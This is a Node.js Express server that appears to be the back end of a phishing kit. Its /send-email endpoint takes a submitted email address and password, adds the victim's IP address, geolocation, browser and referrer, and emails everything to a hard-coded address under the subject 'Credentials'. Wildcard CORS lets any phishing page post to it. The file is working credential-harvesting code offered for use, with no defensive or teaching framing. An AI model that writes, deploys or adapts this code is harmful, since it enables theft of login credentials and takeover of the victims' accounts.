const express = require('express');
const bodyParser = require('body-parser');
const request = require('request');
const { parse } = require('browser-detect');
const sendmail = require('sendmail')();

const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Middleware to handle CORS preflight requests
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Max-Age', '1000');
    if (req.method === 'OPTIONS') {
        res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS, PUT, DELETE');
        res.setHeader('Access-Control-Allow-Headers', 'Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, request-startTime');
        return res.sendStatus(200);
    }
    next();
});

// Function to get user IP address
function getUserIpAddr(req) {
    return req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
}

// Function to get IP information from geoplugin.net
function ip_info(ip, purpose = 'location', deep_detect = true) {
    const url = `http://www.geoplugin.net/json.gp?ip=${ip}`;
    return new Promise((resolve, reject) => {
        request(url, (error, response, body) => {
            if (!error && response.statusCode == 200) {
                const data = JSON.parse(body);
                const output = {
                    city: data.geoplugin_city,
                    state: data.geoplugin_regionName,
                    country: data.geoplugin_countryName,
                    country_code: data.geoplugin_countryCode,
                    continent: data.geoplugin_continentName,
                    continent_code: data.geoplugin_continentCode
                };
                resolve(output);
            } else {
                reject(error || 'Failed to fetch IP information');
            }
        });
    });
}

// Function to build email content
function buildMail(email, password, req) {
    const dateTime = new Date().toLocaleString();
    const hostName = req.headers.referer || 'N/A';
    const browserInfo = parse(req.headers['user-agent']);
    const browserName = browserInfo.name || 'N/A';
    const ipAddress = getUserIpAddr(req);

    return ip_info(ipAddress)
        .then(ipData => {
            const country = ipData.country || 'N/A';
            const state = ipData.state || 'N/A';
            const city = ipData.city || 'N/A';

            const message = `
                Email: ${email} <br>
                Password: ${password} <br>
                Date: ${dateTime} <br>
                Browser: ${browserName} <br>
                Host: ${hostName} <br>
                IP Address: ${ipAddress} <br>
                Country: ${country} <br>
                State: ${state} <br>
                City: ${city}
            `;
            return message;
        })
        .catch(error => {
            console.error('Failed to fetch IP information:', error);
            throw new Error('Failed to fetch IP information');
        });
}

// POST endpoint for sending email
app.post('/send-email', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(422).json({
            message: 'The given data is invalid',
            errors: {
                email: 'The email is required',
                password: 'The password is required',
            }
        });
    }

    buildMail(email, password, req)
        .then(message => {
            const headers = {
                'Content-type': 'text/html;charset=UTF-8'
            };
            
            sendmail({
                from: 'your@sender.email',
                to: 'default@gmail.com',
                subject: 'Credentials',
                html: message,
            }, (err, reply) => {
                if (err) {
                    console.error('Error sending email:', err);
                    res.status(500).json({
                        message: `Message could not be sent. Mailer Error: ${err}`
                    });
                } else {
                    console.log('Email sent:', reply);
                    res.status(200).json({
                        message: 'Message has been sent'
                    });
                }
            });
        })
        .catch(error => {
            console.error('Failed to build email:', error);
            res.status(500).json({
                message: 'Message could not be sent. Failed to build email'
            });
        });
});

// Handle invalid HTTP methods
app.use((req, res) => {
    res.status(405).send('Method Not Allowed');
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
